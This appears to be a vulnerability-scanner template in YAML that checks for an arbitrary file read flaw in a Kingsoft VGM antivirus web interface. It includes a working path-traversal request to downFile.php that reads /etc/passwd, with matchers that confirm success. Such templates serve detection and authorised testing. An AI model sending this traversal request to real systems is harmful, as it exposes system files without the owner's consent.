id: kingsoft-vgm-lfi
name: Kingsoft VGM Antivirus - Arbitrary File Read
severity: high
confidence: confirmed
description: There is an arbitrary file reading vulnerability in Kingsoft Antivirus. An attacker can obtain any file on the
  server through the vulnerability.
reference: https://mp.weixin.qq.com/s?__biz=MzkyMjE3MjEyNQ==&mid=2247486073&idx=1&sn=8e61e162262585bb8ce973b61df989b4&chksm=c1f925cbf68eacddfe441b8f1861e88068039712e467fb9bbe91eae31d439286c7147d197b07
tags:
- kingsoft
- vgm
- lfi
- vuln
requests:
- method: GET
  path: /downFile.php?filename=../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: header
    words:
    - application/force-download
  - type: status
    status:
    - 200
  condition: and
